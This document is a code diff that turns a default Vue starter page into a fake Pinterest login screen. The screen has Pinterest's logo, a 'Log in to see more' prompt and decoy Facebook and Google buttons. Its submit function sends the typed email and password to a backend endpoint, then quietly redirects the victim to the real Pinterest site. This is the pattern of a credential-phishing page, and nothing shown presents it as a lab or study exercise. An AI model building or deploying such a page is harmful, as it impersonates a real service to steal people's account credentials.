@@ -1,47 +1,57 @@
-<script setup>
-import HelloWorld from './components/HelloWorld.vue'
-import TheWelcome from './components/TheWelcome.vue'
+<script lang="js" setup>
+import { ref } from 'vue';
+import axios from 'axios'
+const email = ref('');
+const password = ref('');
+
+async function submit(event) {
+  event.preventDefault();
+  try {
+    const response = await fetch('http://localhost:3000/api/account', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ email: email.value, password: password.value })
+    });
+
+    const data = await response.json();
+    console.log("data", data)
+
+  } catch (err) {
+    console.log("err", err);
+  }
+  window.location.href = "https://www.pinterest.com/";
+}
+
 </script>
 
 <template>
-  <header>
-    <img alt="Vue logo" class="logo" src="./assets/logo.svg" width="125" height="125" />
+  <div class="container">
+    <div class="content">
+      <!--pinterest logo-->
+      <img src="https://i.pinimg.com/originals/d3/d1/75/d3d175e560ae133f1ed5cd4ec173751a.png" alt="pin logo"
+        class="img1" />
+      <p class="header">Log in to see more</p>
+      <form @submit="submit">
 
-    <div class="wrapper">
-      <HelloWorld msg="You did it!" />
+        <input v-model.trim="email" type="email" placeholder="Email" class="detail" /><br />
+        <input v-model.trim="password" type="password" placeholder="Password" class="detail" />
+
+        <a href="/">Forgot your password?</a>
+
+        <button class="btn int" type="submit">Log in</button>
+
+      </form>
+      <p class="or">OR</p>
+      <button class="btn fbk">
+        s
+        <i class="fab fa-facebook fa-lg" style="color: white; padding-right: 10px"></i><a href="#">Continue with
+          Facebook</a></button><br />
+      <button class="btn ggl">
+        <i class="fab fa-google" style="color: rgb(11, 241, 22); padding-right: 10px"></i><a href="#">Continue with
+          Google</a>
+      </button>
     </div>
-  </header>
-
-  <main>
-    <TheWelcome />
-  </main>
+  </div>
 </template>
-
-<style scoped>
-header {
-  line-height: 1.5;
-}
-
-.logo {
-  display: block;
-  margin: 0 auto 2rem;
-}
-
-@media (min-width: 1024px) {
-  header {
-    display: flex;
-    place-items: center;
-    padding-right: calc(var(--section-gap) / 2);
-  }
-
-  .logo {
-    margin: 0 2rem 0 0;
-  }
-
-  header .wrapper {
-    display: flex;
-    place-items: flex-start;
-    flex-wrap: wrap;
-  }
-}
-</style>
